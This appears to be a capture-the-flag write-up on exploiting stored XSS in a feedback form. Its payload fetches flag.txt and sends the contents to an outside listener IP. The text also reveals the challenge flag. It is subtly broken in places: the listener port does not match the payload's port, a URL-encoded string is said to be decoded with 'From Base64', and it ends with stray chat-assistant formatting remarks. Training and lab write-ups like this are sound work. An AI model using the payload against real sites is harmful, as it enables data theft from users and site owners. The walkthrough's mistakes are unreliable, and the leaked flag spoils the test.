# **Web Exploitation - Reading `flag.txt`**

## **Overview**

In this challenge, we need to read the contents of a `flag.txt` file hosted on a vulnerable server. By exploiting a **Cross-Site Scripting (XSS)** vulnerability, we can exfiltrate the contents of the `flag.txt` file to our own server. Below is a step-by-step breakdown of how to achieve this.

---

## **Steps to Solve the Challenge**

### **Step 1: Scan the Target with Nmap**

We start by running an **Nmap scan** to gather information about the target system, including open ports and services.

```bash
nmap -v -A 10.10.11.14
This scan will help confirm if port 8080 is open, which we'll use later.


### **Step 2: Access the Web Application
Once we confirm that port 8080 is open, open your browser and visit the target machine’s IP:

bash
Copy code
http://MACHINE_IP:8080
Here, we’ll find a feedback form, which is likely vulnerable to XSS. We will exploit this vulnerability to retrieve the flag.txt file.

Step 3: Start a Simple HTTP Server to Capture the Flag
Now, let’s start a Python HTTP server on our local machine to capture the exfiltrated data from the vulnerable page.

bash
Copy code
python3 -m http.server 8080
This server will listen for incoming requests on port 8080 from the feedback form.

Step 4: Inject Malicious JavaScript into the Feedback Form
We will inject a JavaScript payload into the feedback form. This script fetches the contents of flag.txt and sends it to our server. The payload is as follows:

html
Copy code
<script>
    fetch('/flag.txt')
        .then(response => response.text())
        .then(data => {
            // Send the flag to our server
            window.location.href = 'http://10.10.224.193:8081/receive?flag=' + encodeURIComponent(data); 
        })
        .catch(error => console.error('Error:', error));
</script>
How the Payload Works:
fetch('/flag.txt'): Requests the flag.txt file from the vulnerable server.
The file contents are sent to our server at http://10.10.224.193:8081/receive, with the contents of flag.txt encoded in the URL.
Step 5: Capture the Flag Exfiltration
When an admin (or any user) views the feedback page, the script will execute and exfiltrate the flag.txt contents to our server. You should see the following log indicating the flag was sent:

perl
Copy code
GET /receive?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1
This is the URL-encoded flag.

Step 6: Decode the Flag Using CyberChef
Now, let’s decode the flag. Copy the URL-encoded string and paste it into CyberChef to decode it:

Go to CyberChef.
Select the "From Base64" operation on the left.
Paste the encoded string THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D into the input box.
The decoded flag will appear on the right:
bash
Copy code
THM{83789a69074f636f64a38879cfcabe8b62305ee6}
Step 7: Retrieve the Flag
We now have the decoded flag, which is:

bash
Copy code
THM{83789a69074f636f64a38879cfcabe8b62305ee6}
This is the flag required to solve the challenge.

Conclusion
We successfully exploited an XSS vulnerability in the feedback form to exfiltrate the contents of the flag.txt file. By using a simple JavaScript payload, we fetched the file contents and sent them to our server. We then used CyberChef to decode the URL-encoded flag.

Security Considerations
This challenge highlights the importance of securing user inputs to prevent XSS vulnerabilities. To mitigate such attacks, the following measures should be taken:

Sanitize User Input: Always sanitize and escape user inputs to prevent malicious code execution.
Content Security Policy (CSP): Implement a strict CSP to block inline JavaScript.
HTTPOnly and Secure Cookies: Ensure sensitive cookies are marked as HttpOnly and Secure to prevent client-side script access.
Additional Resources
Cross-Site Scripting (XSS) Attacks
CyberChef: The Swiss Army Knife of Data Processing
markdown
Copy code

### Key Enhancements:
- **Bolded Step Headings**: All the major steps (e.g., **Step 1**, **Step 2**) are now in bold for better clarity and emphasis.
- The rest of the structure remains the same for readability and flow.

This format will make the document more engaging and easier to follow.









Ch
